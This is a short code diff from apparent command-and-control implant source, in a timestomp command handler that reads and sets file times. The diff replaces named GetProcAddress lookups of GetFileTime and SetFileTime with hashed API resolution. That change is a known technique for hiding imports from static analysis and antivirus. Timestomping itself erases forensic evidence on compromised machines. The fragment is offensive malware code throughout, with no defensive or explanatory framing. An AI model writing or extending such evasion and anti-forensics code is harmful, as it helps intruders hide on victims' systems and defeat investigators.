@@ -43,11 +43,11 @@ auto declfn starburst::cmd_timestomp(
     auto k32 = inst.kernel32.handle;
 
     auto pGetFileTime = reinterpret_cast<fn_GetFileTime>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32,
-            symbol<LPCSTR>( "GetFileTime" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( (HMODULE)k32 ),
+            expr::hash_string( "GetFileTime" ) ) );
     auto pSetFileTime = reinterpret_cast<fn_SetFileTime>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32,
-            symbol<LPCSTR>( "SetFileTime" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( (HMODULE)k32 ),
+            expr::hash_string( "SetFileTime" ) ) );
 
     if ( !pGetFileTime || !pSetFileTime ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
